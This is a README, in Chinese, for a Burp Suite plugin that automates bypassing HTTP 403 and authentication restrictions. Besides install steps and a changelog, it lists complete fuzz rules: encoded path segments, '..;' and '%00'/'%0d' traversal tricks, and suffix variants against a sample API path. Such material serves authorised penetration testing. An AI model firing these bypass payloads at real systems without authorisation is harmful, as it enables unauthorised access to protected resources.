# AutoBypass403-BurpSuite
一个自动化bypass 403/auth的Burpsuite插件

申明：该工具只用于安全自测，禁止用于非法用途

## ChangeLog
#### 2022-07-16

* 修改扫描规则,每一级目录都进行FUZZ,扫描规则如下:

#### 2022-02-08

* 增加title展示,但是存在乱码的bug,后续解决
* 增加规则

#### 2022-06-28

* 修改fuzz逻辑,对每一级路径进行全覆盖

#### 2021-12-05

* 支持多选发送到插件
* 增加多个规则 @Laura_小狮子
* 增加请求数量、结束数量的展示
* 增加相似度匹配(from @pmiaowu HostCollision); 如果返回结果相似度很高，则不展示

#### 2021-12-04

* 增加多线程

#### 2021-12-02 

- 第一次发布

## How to Run ##

1. 下载 Bypass.jar

2. Burpsuite Extender add Bypass.jar

   ![image-20211204120709887](README_picture/image-20211204120709887.png)

   

3. 选择目标请求, 右键点击 "send to bypass 403"

   ![image-20211202221317291](README_picture/image-20211202221317291.png)

4. 选择Bypass 403 table，查看结果

   ![image-20211205121741248](README_picture/image-20211205121741248.png)

5. fuzz规则如下:

```
/web/api/presaleConfig/list

路径FUZZ:

/%77%65%62/api/presaleConfig/list
/web;/api/presaleConfig/list
/images/..;/web/api/presaleConfig/list
/images;/../web/api/presaleConfig/list
/%2e/web/api/presaleConfig/list
/;/web/api/presaleConfig/list
/./web/api/presaleConfig/list
//web/api/presaleConfig/list
/web%20/api/presaleConfig/list
/web%09/api/presaleConfig/list
/.;/web/api/presaleConfig/list
/..%00/web/api/presaleConfig/list
/..%0d/web/api/presaleConfig/list
/..%5c/web/api/presaleConfig/list
/#/../web/api/presaleConfig/list

/web/%61%70%69/presaleConfig/list
/web/api;/presaleConfig/list
/web/images/..;/api/presaleConfig/list
/web/images;/../api/presaleConfig/list
/web/%2e/api/presaleConfig/list
/web/;/api/presaleConfig/list
/web/./api/presaleConfig/list
/web//api/presaleConfig/list
/web/./api/presaleConfig/list
/web/api%20/presaleConfig/list
/web/api%09/presaleConfig/list
/web/.;/api/presaleConfig/list
/web/..%00/api/presaleConfig/list
/web/..%0d/api/presaleConfig/list
/web/..%5c/api/presaleConfig/list
/web/#/../api/presaleConfig/list

后缀FUZZ:
/web/api/presaleConfig/list.js
/web/api/presaleConfig/list.css
/web/api/presaleConfig/list.json
/web/api/presaleConfig/list.html
/web/api/presaleConfig/list;.css
/web/api/presaleConfig/list;.js
/web/api/presaleConfig/list/.
/web/api/presaleConfig/list/
/web/api/presaleConfig/list/./
/web/api/presaleConfig/list%20
/web/api/presaleConfig/list%09
/web/api/presaleConfig/list?
/web/api/presaleConfig/list?error
/web/api/presaleConfig/list#
/web/api/presaleConfig/list/*
/web/api/presaleConfig/list%26
```



## Thanks

*  https://github.com/iamj0ker/bypass-403
